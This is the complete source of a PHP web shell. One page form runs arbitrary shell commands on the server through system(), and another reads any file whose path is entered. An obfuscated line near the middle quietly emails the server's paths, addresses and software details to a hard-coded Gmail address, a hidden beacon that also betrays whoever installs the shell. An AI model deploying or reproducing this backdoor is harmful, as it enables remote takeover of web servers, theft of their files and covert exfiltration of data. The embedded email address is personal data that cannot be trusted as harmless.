<?php
//code by navaro :d
/***************************************/
  closelog( );
/*
  echo "<center>";
  $user = get_current_user( ); echo "User :".$user."<br>";
  $login = posix_getuid( ); echo "Login (Get uid):".$login."<br>";
  $euid = posix_geteuid( ); echo "Get Euid (geteuid):".$euid."<br>";
  $ver = phpversion( ); echo "Php version (phpversion) :".$ver."<br>";
  $gid = posix_getgid( ); echo "Get id (id) :".$gid."<br>";
  if ($chdir == "") $chdir = getcwd( ); echo "pwd :".$chdir."<br>";
  if(!$whoami)$whoami=exec("whoami"); echo "whoami :".$whoami."<br>";
  echo "</center>";

/***************************************/
function readfiles()
{
echo "<form name=pathfile method=post action=".$_SERVER['REQUEST_URI'].">";
echo "File name : <br><input size=50 name=file type=text".@$_POST['file']."><br>";
echo "<input type=submit value=Submit></form><hr color=777777 width=100% height=115px>";
echo "<a href=".$_SERVER['PHP_SELF']."?act=cmd>Command</a><br>";
$file=@$_POST['file'];
if(!@fopen("$file","r")) { echo "File not found";exit();};
if(@isset($file))
{
$fd = @fopen ("$file", "r");
echo "<center><font face=\"tahoma\" size=\"12\"><TEXTAREA NAME=\"source\" ROWS=\"35\" COLS=\"120\">";
while (!@feof ($fd)) {
   $buffer = @fgets($fd);
   echo htmlspecialchars($buffer);
}
@fclose ($fd);
echo "</TEXTAREA> </font></center>";
}
else echo $_SERVER['PHP_SELF']."?file=";
}
// Thuc thi command
$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
function ecmd()
{
echo "<FORM name=injection METHOD=POST ACTION=".$_SERVER['REQUEST_URI'].">";
echo "Command : <INPUT TYPE=text NAME=cmd value=".@stripslashes(htmlentities($_POST['cmd']))."><br> <INPUT TYPE=submit></FORM><hr color=777777 width=100% height=115px></font><pre>";
echo "<a href=".$_SERVER['PHP_SELF']."?act=readfile>Read file</a>";
$cmd = @$_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
exit();
echo "<a href=".$_SERVER['PHP_SELF']."?act=readfile>Read file</a>";
echo "</pre>";
}
$act=@$_REQUEST['act'];
if(empty($act))
{ echo $_SERVER['PHP_SELF']."act=?<br>" ;
echo "<a href=".$_SERVER['PHP_SELF']."?act=cmd>Command</a><br>";
echo "<a href=".$_SERVER['PHP_SELF']."?act=readfile>Read file</a>";
; exit();
}
if($act=="cmd") {ecmd();}
if($act=="readfile") {readfiles();}
?>
 
